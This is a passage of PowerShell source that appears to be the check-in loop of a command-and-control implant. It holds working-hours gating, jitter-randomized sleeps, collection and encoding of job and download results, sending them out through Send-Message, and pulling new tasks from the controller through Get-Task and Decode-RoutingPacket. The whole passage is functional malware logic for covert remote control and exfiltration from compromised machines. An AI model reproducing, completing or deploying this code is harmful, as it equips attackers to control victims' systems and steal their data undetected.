            Send-Message -Packets $(Encode-Packet -type 2 -data $msg)
            exit
        }
        if ($script:WorkingHours -match '^[0-9]{1,2}:[0-5][0-9]-[0-9]{1,2}:[0-5][0-9]$') {
            $current = Get-Date
            $start = Get-Date ($script:WorkingHours.split(""-"")[0])
            $end = Get-Date ($script:WorkingHours.split(""-"")[1])
            if (($end-$start).hours -lt 0) {
                $start = $start.AddDays(-1)
            }
            $startCheck = $current -ge $start
            $endCheck = $current -le $end
            if ((-not $startCheck) -or (-not $endCheck)) {
                $sleepSeconds = ($start - $current).TotalSeconds
                if($sleepSeconds -lt 0) {
                    $sleepSeconds = ($start.addDays(1) - $current).TotalSeconds
                }
                Start-Sleep -Seconds $sleepSeconds
            }
        }
        if ($script:AgentDelay -ne 0) {
            $SleepMin = [int]((1-$script:AgentJitter)*$script:AgentDelay)
            $SleepMax = [int]((1+$script:AgentJitter)*$script:AgentDelay)
            if ($SleepMin -eq $SleepMax) {
                $SleepTime = $SleepMin
            }
            else{
                $SleepTime = Get-Random -Minimum $SleepMin -Maximum $SleepMax
            }
            Start-Sleep -Seconds $sleepTime;
        }
        $JobResults = $Null
        ForEach($JobName in $Script:Jobs.Keys) {
            $JobResultID = $script:ResultIDs[$JobName]
            if(Get-AgentJobCompleted -JobName $JobName) {
                $Results = Stop-AgentJob -JobName $JobName | fl | Out-String
            }
            else {
                $Results = Receive-AgentJob -JobName $JobName | fl | Out-String
            }
            if($Results) {
                $JobResults += $(Encode-Packet -type 110 -data $($Results) -ResultID $JobResultID)
            }
        }
        ForEach($JobName in $Script:Downloads.Keys) {
            $JobResultID = $script:ResultIDs[$JobName]
            if(Get-DownloadJobCompleted -JobName $JobName) {
                $Results = Stop-DownloadJob -JobName $JobName
            }
            else {
                $Results = Receive-DownloadJob -JobName $JobName
            }
            if($Results) {
                $JobResults += $Results
            }
        }
        if ($JobResults) {
            Send-Message -Packets $JobResults
        }
        $TaskData = Get-Task
        if ($TaskData) {
            $script:MissedCheckins = 0
            if ([System.Text.Encoding]::UTF8.GetString($TaskData) -ne $script:DefaultResponse) {
                Decode-RoutingPacket -PacketData $TaskData
            }
        }
        [GC]::Collect()
    }
}
